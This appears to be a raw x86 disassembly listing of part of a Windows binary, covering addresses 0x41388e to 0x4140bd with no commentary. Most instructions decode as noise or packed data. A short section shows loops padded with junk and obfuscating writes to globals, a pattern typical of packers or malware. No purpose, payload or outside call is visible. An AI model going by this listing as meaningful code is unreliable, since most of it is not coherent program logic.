  41388e:	fimul  WORD PTR [eax-0x3ac366a6]
  413894:	xor    ebx,esp
  413896:	in     eax,0xa0
  413898:	sub    edi,DWORD PTR [ecx+0x11]
  41389b:	sub    BYTE PTR [ebp+0x53],dh
  41389e:	and    al,0x28
  4138a0:	adc    al,0xed
  4138a2:	xchg   edx,eax
  4138a3:	repnz hlt 
  4138a5:	and    eax,0xc0decc0e
  4138aa:	xor    DWORD PTR [ecx],ecx
  4138ac:	call   0x3bc1:0xe5b6d1f9
  4138b3:	pop    es
  4138b4:	mov    ebp,0x155d140
  4138b9:	lahf   
  4138ba:	push   ecx
  4138bb:	cmp    DWORD PTR [ebp+0x26178fd],0x9
  4138c2:	call   0x4bbf:0xbe05fe27
  4138c9:	pop    edi
  4138ca:	enter  0x8b1d,0x17
  4138ce:	mov    eax,ds:0x5e3813d5
  4138d3:	dec    edi
  4138d4:	and    ch,bl
  4138d6:	ins    BYTE PTR es:[edi],dx
  4138d7:	mov    bh,0x7c
  4138d9:	dec    edi
  4138da:	dec    eax
  4138db:	mov    edi,0xef8460e2
  4138e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e1:	jo     0x413884
  4138e3:	or     ah,BYTE PTR [edx+0x681aa619]
  4138e9:	shr    BYTE PTR [edx],1
  4138eb:	scas   al,BYTE PTR es:[edi]
  4138ec:	ins    DWORD PTR es:[edi],dx
  4138ed:	popw   ss
  4138ef:	clc    
  4138f0:	fxch   st(6)
  4138f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138f3:	mov    cl,0x34
  4138f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138f6:	hlt    
  4138f7:	jmp    0x4ad93dbe
  4138fc:	add    cl,BYTE PTR [ebp-0x38]
  4138ff:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413901:	mov    eax,ds:0xbe49d734
  413906:	clc    
  413907:	pushf  
  413908:	xchg   esi,eax
  413909:	sbb    DWORD PTR [ebp-0x79],eax
  41390c:	imul   edx,DWORD PTR [ebp+eiz*2+0x5054a938],0x2d36ac13
  413917:	push   edx
  413918:	sbb    al,0x18
  41391a:	mul    DWORD PTR [ecx+0x224959b7]
  413920:	xor    ebx,DWORD PTR [ebp-0x23]
  413923:	les    ebx,FWORD PTR [eax+0x2b]
  413926:	mov    ch,0x20
  413928:	cld    
  413929:	test   DWORD PTR [ebx-0x6d58efcf],eax
  41392f:	sbb    al,0x6b
  413931:	out    dx,al
  413932:	xor    eax,0x743a7fba
  413937:	stos   DWORD PTR es:[edi],eax
  413938:	lea    ecx,[eax]
  41393a:	jge    0x4139a7
  41393c:	jg     0x413989
  41393e:	push   0xfffffffd
  413940:	(bad)  
  413941:	sbb    ah,BYTE PTR [ecx]
  413943:	out    0xe4,eax
  413945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413946:	mov    ?,eax
  413948:	mov    ds:0x450152cf,al
  41394d:	mov    bh,BYTE PTR [esi]
  41394f:	add    al,0xfb
  413951:	cmp    cl,BYTE PTR [esi]
  413953:	cmp    eax,0x9543d0eb
  413958:	ds sub eax,esi
  41395b:	lods   al,BYTE PTR ds:[esi]
  41395c:	dec    esp
  41395d:	out    dx,al
  41395e:	push   eax
  41395f:	jge    0x4139af
  413961:	jl     0x413985
  413963:	out    0x39,al
  413965:	imul   ebx,esi,0x59
  413968:	jg     0x413966
  41396a:	fisttp WORD PTR [ebx]
  41396c:	cmc    
  41396d:	ins    DWORD PTR es:[edi],dx
  41396e:	xor    al,0x92
  413970:	pop    esi
  413971:	dec    esi
  413972:	(bad)  
  413973:	retf   0x46cd
  413976:	out    0xab,al
  413978:	or     al,dh
  41397a:	(bad)  
  41397c:	int3   
  41397d:	pop    edx
  41397e:	jl     0x4139b2
  413980:	or     ebx,DWORD PTR [eax+eax*8]
  413983:	mov    al,0xce
  413985:	out    0x59,eax
  413987:	test   DWORD PTR [esi],edi
  413989:	pop    es
  41398a:	shl    DWORD PTR [ebx-0x25],0x26
  41398e:	pop    es
  41398f:	aam    0x7c
  413991:	and    al,0x26
  413993:	push   0x77
  413995:	fstp   DWORD PTR [esi+0x3b5af64e]
  41399b:	pop    ss
  41399c:	push   cs
  41399d:	outs   dx,DWORD PTR ds:[esi]
  41399e:	std    
  41399f:	pop    ebp
  4139a0:	push   ds
  4139a1:	jne    0x4139d3
  4139a3:	mov    WORD PTR [edx-0x2f],gs
  4139a6:	mov    cl,0xfb
  4139a8:	jnp    0x41398f
  4139aa:	cdq    
  4139ab:	and    eax,0xc3d12a43
  4139b0:	mov    ds:0x3c08c30e,al
  4139b5:	lds    esi,FWORD PTR [ecx+0x66]
  4139b8:	test   eax,0xa95ce7d2
  4139bd:	sti    
  4139be:	nop
  4139bf:	jp     0x413a32
  4139c1:	test   al,0xaa
  4139c3:	xor    ebp,edi
  4139c5:	jp     0x413953
  4139c7:	pop    ebx
  4139c8:	mov    eax,ds:0x604ed7f4
  4139cd:	push   es
  4139ce:	pusha  
  4139cf:	shr    DWORD PTR [ebp+edi*2+0x4f841dd2],cl
  4139d6:	lea    edx,[ecx+ebp*8]
  4139d9:	imul   esi,DWORD PTR [ebx-0x7041a2fa],0xd44d1e92
  4139e3:	mov    al,ds:0x3fb4c472
  4139e8:	pop    esi
  4139e9:	push   esp
  4139ea:	out    0x88,al
  4139ec:	shl    edi,cl
  4139ee:	xor    eax,0x34a74f84
  4139f3:	mov    dl,BYTE PTR [edi]
  4139f5:	outs   dx,BYTE PTR ds:[esi]
  4139f6:	(bad)  
  4139f7:	js     0x4139f9
  4139f9:	fbstp  TBYTE PTR [edx]
  4139fb:	jb     0x4139a0
  4139fd:	mov    esp,0xffe93097
  413a02:	jns    0x413a68
  413a04:	dec    edi
  413a05:	xor    DWORD PTR [eax],ebp
  413a07:	sub    al,0x19
  413a09:	cld    
  413a0a:	aam    0xa9
  413a0c:	push   edx
  413a0d:	aam    0x6f
  413a0f:	xchg   ecx,eax
  413a10:	out    dx,eax
  413a11:	into   
  413a12:	sti    
  413a13:	div    BYTE PTR [ebx-0xc1a3808]
  413a19:	xchg   edx,eax
  413a1a:	pop    ds
  413a1b:	sub    eax,0x52fe2c3d
  413a20:	clc    
  413a21:	jo     0x413a17
  413a23:	and    BYTE PTR [ecx],0x4e
  413a26:	jg     0x413a9e
  413a28:	sub    cl,bh
  413a2a:	bound  ecx,QWORD PTR [eax+0x6e24e6cc]
  413a30:	xor    BYTE PTR [ebx-0x54c4ae81],ah
  413a36:	retf   
  413a37:	xor    BYTE PTR [ecx+0x1efb375d],dl
  413a3d:	jno    0x413a78
  413a3f:	das    
  413a40:	jmp    0xb5d0:0x39828698
  413a47:	jb     0x413a59
  413a49:	out    0x42,eax
  413a4b:	arpl   WORD PTR [ebx-0x1f5d5267],bx
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	mov    ds:0x7e072f31,eax
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	repnz mov bl,0xac
  413a76:	cmp    eax,0x22823df7
  413a7b:	adc    eax,0x9bc26a4d
  413a80:	adc    ecx,DWORD PTR es:[ecx+0x7bc82075]
  413a87:	pop    esp
  413a88:	mov    eax,ds:0x97db68b9
  413a8d:	or     DWORD PTR [eax-0x72],ebx
  413a90:	add    ebp,esp
  413a92:	in     eax,0xb4
  413a94:	das    
  413a95:	cld    
  413a96:	mov    ebx,ebp
  413a98:	adc    BYTE PTR [eax+0x290218cb],dh
  413a9e:	inc    esp
  413a9f:	sbb    al,0xa8
  413aa1:	dec    edx
  413aa2:	pop    ebp
  413aa3:	loopne 0x413abd
  413aa5:	ss jecxz 0x413a8d
  413aa8:	test   BYTE PTR [eax],cl
  413aaa:	pop    esi
  413aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aac:	or     BYTE PTR [ecx+0x59],bh
  413aaf:	xchg   ebp,ebx
  413ab1:	inc    dl
  413ab3:	pop    es
  413ab4:	loope  0x413a3e
  413ab6:	sbb    al,0x70
  413ab8:	sbb    BYTE PTR [eax+edx*8],dl
  413abb:	xchg   ecx,eax
  413abc:	icebp  
  413abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413abe:	cwde   
  413abf:	push   ss
  413ac0:	and    BYTE PTR [edx-0x1451c8c5],ah
  413ac6:	mov    al,0x79
  413ac8:	fild   DWORD PTR [ebp+eax*1+0x44]
  413acc:	add    DWORD PTR ds:0x77686ce0,eax
  413ad2:	sbb    al,0xce
  413ad4:	mov    ecx,0x9928d586
  413ad9:	(bad)  
  413ada:	fbld   TBYTE PTR [ebx+0x6e]
  413add:	ud0    eax,DWORD PTR [ebx+0x42ce67a2]
  413ae4:	sbb    DWORD PTR [ecx],eax
  413ae6:	mov    esp,0x4bc3ed67
  413aeb:	add    BYTE PTR [ecx],0x5c
  413aee:	pop    esp
  413aef:	(bad)  
  413af0:	adc    esi,DWORD PTR [ecx]
  413af2:	jecxz  0x413afe
  413af4:	ret    0x8fc0
  413af7:	rol    al,1
  413af9:	adc    edi,DWORD PTR [edx-0x60]
  413afc:	out    dx,eax
  413afd:	xchg   edx,eax
  413afe:	sti    
  413aff:	shl    bl,0x23
  413b02:	call   0x1452e62e
  413b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b08:	jg     0x413b29
  413b0a:	cmp    BYTE PTR [edx-0x7dfa15da],ah
  413b10:	fistp  WORD PTR [edi]
  413b12:	pop    edi
  413b13:	lahf   
  413b14:	pop    esi
  413b15:	imul   ebp,DWORD PTR [edx+0x7d109566],0xd8c3316b
  413b1f:	lds    esp,FWORD PTR [esi-0x9feb275]
  413b25:	push   ebx
  413b26:	scas   eax,DWORD PTR es:[edi]
  413b27:	add    ch,0x5b
  413b2a:	clc    
  413b2b:	jae    0x413abf
  413b2d:	or     ch,BYTE PTR [ebx+0x4b]
  413b30:	pop    ebp
  413b31:	or     bh,BYTE PTR [ecx-0x469ea314]
  413b37:	mov    ecx,0xe51b650a
  413b3c:	das    
  413b3d:	mov    bl,0xec
  413b3f:	dec    edi
  413b40:	adc    eax,0x8ef31840
  413b45:	scas   al,BYTE PTR es:[edi]
  413b46:	ds and edx,ecx
  413b49:	into   
  413b4a:	dec    ebx
  413b4b:	shr    DWORD PTR [edi-0x61],0xc7
  413b4f:	push   esp
  413b50:	push   cs
  413b51:	in     eax,0x68
  413b53:	adc    BYTE PTR [edi],al
  413b55:	xchg   BYTE PTR [ecx],ch
  413b57:	mov    dl,0xca
  413b59:	mov    al,0xda
  413b5b:	loope  0x413aff
  413b5d:	push   ds
  413b5e:	data16 and al,0xf8
  413b61:	xor    ch,BYTE PTR [esi+0x4148f2c3]
  413b67:	jg     0x413afc
  413b69:	adc    DWORD PTR [edi+edi*4-0x7e],esi
  413b6d:	pushf  
  413b6e:	mov    eax,0x69071e37
  413b73:	mov    ebx,0xa952c95d
  413b78:	jle    0x413bb3
  413b7a:	adc    ah,0x12
  413b7d:	mov    bl,0x52
  413b7f:	(bad)  
  413b80:	pushf  
  413b81:	xchg   ebp,eax
  413b82:	pop    esi
  413b83:	xchg   ecx,eax
  413b84:	sbb    eax,DWORD PTR [ebp+0x5a]
  413b87:	test   eax,0x4f3d81c1
  413b8c:	xor    bl,0x3a
  413b8f:	ins    BYTE PTR es:[edi],dx
  413b90:	nop
  413b91:	or     al,0xfb
  413b93:	sub    BYTE PTR [ebp-0x48],ah
  413b96:	sub    BYTE PTR [eax+0x38],ch
  413b99:	mov    ebx,0xf2a242d6
  413b9e:	stos   DWORD PTR es:[edi],eax
  413b9f:	xor    BYTE PTR [esi+0x5f53a80c],ch
  413ba5:	add    dh,BYTE PTR [edi-0x2e677f9b]
  413bab:	lock sti 
  413bad:	arpl   WORD PTR [eax-0x3a],cx
  413bb0:	ret    0xbbdc
  413bb3:	xor    ah,0x2c
  413bb6:	xor    eax,0x761e2864
  413bbb:	das    
  413bbc:	xor    BYTE PTR [eax+ebp*1],ch
  413bbf:	retf   
  413bc0:	and    BYTE PTR [edi-0x1f],bh
  413bc3:	jp     0x413ba9
  413bc5:	leave  
  413bc6:	inc    ecx
  413bc7:	xor    BYTE PTR [ecx+0x339802b8],bh
  413bcd:	mov    ch,0x43
  413bcf:	retf   0x49df
  413bd2:	adc    BYTE PTR [edx],bh
  413bd4:	mov    ecx,0x69b2d114
  413bd9:	int    0xb1
  413bdb:	or     DWORD PTR [esi-0x57d1be2b],0x5b
  413be2:	jo     0x413be1
  413be4:	loop   0x413c55
  413be6:	adc    cl,ah
  413be8:	daa    
  413be9:	aam    0x6b
  413beb:	ror    BYTE PTR [edi+eiz*4],1
  413bee:	les    eax,FWORD PTR [edi+esi*2]
  413bf1:	sbb    eax,0x3adb02d
  413bf6:	adc    bh,BYTE PTR [eax]
  413bf8:	ins    BYTE PTR es:[edi],dx
  413bf9:	mov    ecx,0x54b36fab
  413bfe:	jmp    0x19c9:0x908edb13
  413c05:	mov    dh,0xe5
  413c07:	rcr    BYTE PTR [edi+ebx*1-0x7064f4bf],1
  413c0e:	mov    cl,0xb3
  413c10:	fidiv  DWORD PTR [edi-0xe]
  413c13:	jne    0x413c51
  413c15:	mov    ah,0xfb
  413c17:	call   0xfb65:0x83be5c0e
  413c1e:	ins    BYTE PTR es:[edi],dx
  413c1f:	xchg   bx,ax
  413c21:	jb     0x413c3b
  413c23:	or     DWORD PTR [eax+edi*4-0x2b10c46],esp
  413c2a:	adc    edx,eax
  413c2c:	cdq    
  413c2d:	scas   eax,DWORD PTR es:[edi]
  413c2e:	xor    BYTE PTR [esi-0x6d2fe336],dh
  413c34:	mov    esi,0x48d4ba72
  413c39:	mov    ecx,0x14fc4950
  413c3e:	cmp    DWORD PTR [eax-0x52],ebx
  413c41:	mov    esi,0x9c758b78
  413c46:	fimul  DWORD PTR [ecx-0x33391d53]
  413c4c:	in     al,0x3d
  413c4e:	adc    BYTE PTR [ebx],dh
  413c50:	jecxz  0x413c90
  413c52:	outs   dx,BYTE PTR ds:[esi]
  413c53:	cmp    DWORD PTR [ecx-0xb],0x5139d4da
  413c5a:	add    dl,BYTE PTR [esp+edx*4-0x78]
  413c5e:	pop    ecx
  413c5f:	pop    esi
  413c60:	in     al,0xed
  413c62:	out    dx,al
  413c63:	int3   
  413c64:	jne    0x413c55
  413c66:	mov    DWORD PTR [edx],ebx
  413c68:	(bad)  
  413c69:	in     al,dx
  413c6a:	jae    0x413c2e
  413c6c:	jecxz  0x413cba
  413c6e:	jns    0x413c63
  413c70:	sub    al,0x9b
  413c72:	test   al,dh
  413c74:	lods   al,BYTE PTR ds:[esi]
  413c75:	out    dx,eax
  413c76:	std    
  413c77:	push   ds
  413c78:	lea    eax,[edx+0x4a4754ac]
  413c7e:	mov    ds:0x76e7740,eax
  413c83:	mov    ebp,DWORD PTR [eax]
  413c85:	cmp    eax,0xac0598b1
  413c8a:	stos   BYTE PTR es:[edi],al
  413c8b:	mov    ch,0xf4
  413c8d:	pop    esp
  413c8e:	js     0x413cf4
  413c90:	bound  edx,QWORD PTR [edi-0x4b3b8748]
  413c96:	cs dec esi
  413c98:	dec    esi
  413c99:	hlt    
  413c9a:	jecxz  0x413c48
  413c9c:	mov    dh,0xde
  413c9e:	jecxz  0x413c64
  413ca0:	adc    bl,cl
  413ca2:	push   ebx
  413ca3:	push   ebp
  413ca4:	cmp    dh,BYTE PTR [edx-0x22e0e797]
  413caa:	mov    ch,0x27
  413cac:	leave  
  413cad:	test   eax,0x772d80b5
  413cb2:	jno    0x413d17
  413cb4:	xor    esp,DWORD PTR [edx+0x1d]
  413cb7:	test   DWORD PTR [edx+0x5bb306e],eax
  413cbd:	das    
  413cbe:	into   
  413cbf:	pop    ecx
  413cc1:	add    ebp,DWORD PTR [ecx-0x6]
  413cc4:	ss mov ecx,0x6657b875
  413cca:	das    
  413ccb:	push   0x60bcf680
  413cd0:	inc    edx
  413cd1:	dec    BYTE PTR ds:[edx]
  413cd4:	or     BYTE PTR [edi+ebx*8],0xf2
  413cd8:	retf   
  413cd9:	ds cdq 
  413cdb:	nop
  413cdc:	in     eax,0x1c
  413cde:	and    al,BYTE PTR [eax+edx*2+0x72]
  413ce2:	pop    esi
  413ce3:	push   ds
  413ce4:	ror    al,1
  413ce6:	jmp    0x9af103f
  413ceb:	jg     0x413cf0
  413ced:	jle    0x413cb3
  413cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf2:	push   eax
  413cf3:	and    eax,0x3ac468c5
  413cf8:	xor    eax,0x273d5013
  413cfd:	jl     0x413cd8
  413cff:	test   BYTE PTR [ebp-0x775f50bb],ah
  413d05:	ret    0x19a6
  413d08:	mov    bh,BYTE PTR [edx-0x3a8f3b7b]
  413d0e:	mov    dh,0x93
  413d10:	je     0x413cfe
  413d12:	ja     0x413d4b
  413d14:	push   0xa70e3a64
  413d19:	dec    eax
  413d1a:	pop    ss
  413d1b:	add    BYTE PTR es:[esi+0x3],ch
  413d1f:	mov    cl,0x4e
  413d21:	shl    DWORD PTR [ecx+0x5dd534b9],0x62
  413d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d29:	ret    
  413d2a:	adc    eax,0x8abc8904
  413d2f:	aas    
  413d30:	sub    eax,0xc65a0178
  413d35:	sbb    al,0xde
  413d37:	pop    eax
  413d38:	sahf   
  413d39:	scas   al,BYTE PTR es:[edi]
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	pop    DWORD PTR [ecx+0x476adc41]
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e6a
  413e98:	or     eax,0x2e562dc7
  413e9d:	jns    0x413ebe
  413e9f:	in     al,dx
  413ea0:	imul   esp,DWORD PTR [ebp-0x709aee75],0x2354f3e9
  413eaa:	xchg   edi,eax
  413eab:	pop    ds
  413eac:	xchg   BYTE PTR [eax+eiz*1-0x3b],al
  413eb0:	and    al,0xd7
  413eb2:	jg     0x413eab
  413eb4:	mov    ecx,DWORD PTR [edi-0x2]
  413eb7:	cmp    edi,DWORD PTR [ecx+0x885918e]
  413ebd:	mov    WORD PTR [ebx+ebx*8],ss
  413ec0:	and    bh,BYTE PTR [eax-0x33]
  413ec3:	and    eax,0xb62cc0c9
  413ec8:	jae    0x413f22
  413eca:	retf   0xa2f0
  413ecd:	in     eax,0xc7
  413ecf:	in     al,dx
  413ed0:	push   ecx
  413ed1:	sub    eax,0x9eccdbd6
  413ed6:	out    0x16,eax
  413ed8:	jecxz  0x413f38
  413eda:	inc    edi
  413edb:	test   BYTE PTR [esp+eiz*8-0x6dcd22c2],al
  413ee2:	mov    ah,0xe8
  413ee4:	dec    ebx
  413ee5:	repnz mov ch,0x49
  413ee8:	xor    ebx,edx
  413eea:	jbe    0x413ef5
  413eec:	aas    
  413eed:	ja     0x413ee5
  413eef:	mov    al,ds:0xd796c1ed
  413ef4:	and    al,0xdd
  413ef6:	cmp    DWORD PTR [edx-0x31],edx
  413ef9:	test   eax,0x71e704ab
  413efe:	jns    0x413f25
  413f00:	lods   al,BYTE PTR ds:[esi]
  413f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f02:	push   esp
  413f03:	not    BYTE PTR [edx]
  413f05:	push   ds
  413f06:	push   ss
  413f07:	cmp    esp,DWORD PTR [ecx-0x61cc9eb4]
  413f0d:	scas   eax,DWORD PTR es:[edi]
  413f0e:	stos   DWORD PTR es:[edi],eax
  413f0f:	or     BYTE PTR [ecx+edx*1-0x61f575ae],cl
  413f16:	mov    esi,0x72a2e09f
  413f1b:	cdq    
  413f1c:	iret   
  413f1d:	xchg   ebx,eax
  413f1e:	mov    esi,DWORD PTR ds:0x94b512e1
  413f24:	scas   al,BYTE PTR es:[edi]
  413f25:	mov    ebp,DWORD PTR [ecx+0x1aaec385]
  413f2b:	xor    BYTE PTR [ecx-0x65e86e44],0xa9
  413f32:	test   dl,0xe0
  413f35:	outs   dx,DWORD PTR ds:[esi]
  413f36:	(bad)  
  413f37:	test   DWORD PTR [esi+0x7f],0x7735a26
  413f3e:	jbe    0x413f33
  413f40:	mov    eax,0x326a2473
  413f45:	jg     0x413ee1
  413f47:	or     ah,cl
  413f49:	fidiv  WORD PTR [ecx]
  413f4b:	sbb    BYTE PTR [ebp+0x62f70a76],0x1c
  413f52:	sahf   
  413f53:	xchg   edi,eax
  413f54:	mov    esi,0x81476724
  413f59:	pop    ebx
  413f5a:	pusha  
  413f5b:	iret   
  413f5c:	mov    ds:0xf501c988,al
  413f61:	mov    ebp,0xec0b599b
  413f66:	inc    esi
  413f67:	adc    al,0xeb
  413f69:	dec    eax
  413f6a:	sub    esp,esp
  413f6c:	jmp    0xea52:0x4086eaa6
  413f73:	cmp    dh,BYTE PTR [edx+edx*2-0x7858e56]
  413f7a:	pop    esp
  413f7b:	hlt    
  413f7c:	gs jns 0x413f81
  413f7f:	push   cs
  413f80:	push   esp
  413f81:	(bad)  
  413f82:	mov    al,ds:0xd165f039
  413f87:	dec    edx
  413f88:	nop
  413f89:	xor    esp,DWORD PTR ds:0x7bb7ea20
  413f8f:	pop    esp
  413f90:	pop    es
  413f91:	dec    esi
  413f92:	(bad)  
  413f93:	jp     0x413ffb
  413f95:	xchg   DWORD PTR [ecx+0x8c2141f],eax
  413f9b:	add    BYTE PTR [edx-0x1b486729],cl
  413fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fa2:	pusha  
  413fa3:	rol    BYTE PTR [ebx+esi*1],1
  413fa6:	mov    edi,0x20e56cfc
  413fab:	outs   dx,BYTE PTR ds:[esi]
  413fac:	std    
  413fad:	imul   esp,DWORD PTR [bx],0xfffffff2
  413fb1:	ss das 
  413fb3:	and    dh,BYTE PTR [esi-0x33]
  413fb6:	sbb    ebp,ebx
  413fb8:	clc    
  413fb9:	jne    0x413fd6
  413fbb:	(bad)  
  413fbc:	cmc    
  413fbd:	push   0xbeddf110
  413fc2:	jns    0x41401b
  413fc4:	dec    ecx
  413fc5:	mov    ebx,0x1029cf4d
  413fca:	retf   
  413fcb:	add    BYTE PTR [edi],dh
  413fcd:	lods   eax,DWORD PTR ds:[esi]
  413fce:	cli    
  413fcf:	xchg   ebp,eax
  413fd0:	mov    dl,bh
  413fd2:	sti    
  413fd3:	ror    DWORD PTR [edx-0x4714a70c],1
  413fd9:	das    
  413fda:	mov    eax,ds:0x2cb64009
  413fdf:	jnp    0x413fe5
  413fe1:	ja     0x413fac
  413fe3:	aas    
  413fe4:	jp     0x41403e
  413fe6:	xor    DWORD PTR [edx],edi
  413fe8:	pop    edx
  413fe9:	jno    0x414039
  413feb:	jl     0x41405a
  413fed:	jno    0x413fb7
  413fef:	xor    esi,ebp
  413ff1:	mul    BYTE PTR [ecx+0x6fd110c7]
  413ff7:	add    al,BYTE PTR [edi]
  413ff9:	adc    BYTE PTR [esp+edi*8],ah
  413ffc:	sbb    DWORD PTR [ebx],eax
  413ffe:	sub    dl,BYTE PTR [ecx+0x1a78c1de]
  414004:	mov    ah,0xba
  414006:	xchg   edi,eax
  414007:	jae    0x41400f
  414009:	out    dx,eax
  41400a:	lods   eax,DWORD PTR ds:[esi]
  41400b:	loope  0x41401a
  41400d:	(bad)  
  41400e:	jge    0x413fc1
  414010:	loope  0x413fd4
  414012:	stos   BYTE PTR es:[edi],al
  414013:	sti    
  414014:	fisub  WORD PTR [edx-0x5c377b0c]
  41401a:	mov    dh,0x14
  41401c:	rcr    DWORD PTR [ebx-0x2884364],1
  414022:	pop    edi
  414023:	mov    ch,0xcf
  414025:	cmp    BYTE PTR [edi+0x62],0x23
  414029:	shr    DWORD PTR [edx],1
  41402b:	ret    
  41402c:	push   ecx
  41402d:	dec    esp
  41402e:	ret    
  41402f:	imul   esp,DWORD PTR [ecx+0x2c946f93],0x111095b8
  414039:	outs   dx,DWORD PTR ds:[esi]
  41403a:	push   ebx
  41403b:	push   ds
  41403c:	pushf  
  41403d:	and    BYTE PTR [edx],0x32
  414040:	mov    dh,BYTE PTR [esi]
  414042:	popa   
  414043:	or     esi,DWORD PTR [eax+esi*8+0x11]
  414047:	sbb    DWORD PTR [ecx+0x1a],0xffffffc6
  41404b:	mov    eax,ds:0xc8fc81ea
  414050:	hlt    
  414051:	ror    BYTE PTR [ebx],0x82
  414054:	adc    DWORD PTR [edx],eax
  414056:	arpl   WORD PTR [esi+0x67],di
  414059:	pop    ecx
  41405a:	loop   0x414062
  41405c:	jg     0x413fe7
  41405e:	mov    ss,esp
  414060:	stc    
  414061:	push   ds
  414062:	xchg   edx,eax
  414063:	push   edi
  414064:	dec    esp
  414065:	or     dl,BYTE PTR [eax]
  414067:	push   edi
  414068:	ror    edx,0xa6
  41406b:	aas    
  41406c:	dec    esp
  41406d:	xchg   edx,eax
  41406e:	imul   al
  414070:	mov    ebx,0x8c59ec6b
  414075:	mov    eax,0x230531fe
  41407a:	mov    edi,0x503a4acd
  41407f:	inc    ecx
  414080:	push   cs
  414081:	lods   eax,DWORD PTR ds:[esi]
  414082:	inc    esi
  414083:	cmp    al,0x8
  414085:	in     eax,dx
  414086:	scas   eax,DWORD PTR es:[edi]
  414087:	add    al,0x1
  414089:	(bad)  
  41408a:	out    0x5b,al
  41408c:	lock mul DWORD PTR [edi*8-0x6baa67cb]
  414094:	les    esp,FWORD PTR [ebx-0x5c]
  414097:	mov    bh,BYTE PTR [edi+ebp*1-0x69c689d7]
  41409e:	ret    0x5101
  4140a1:	ret    0xc9dd
  4140a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a5:	ror    BYTE PTR [ebx-0x5],1
  4140a8:	popa   
  4140a9:	jge    0x4140b9
  4140ab:	push   esp
  4140ac:	daa    
  4140ad:	mov    edi,0x60b9d160
  4140b2:	add    al,0x3a
  4140b4:	(bad)  
  4140b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140b6:	add    eax,0x2aaccd3e
  4140bb:	sar    ah,cl
  4140bd:	push   ds
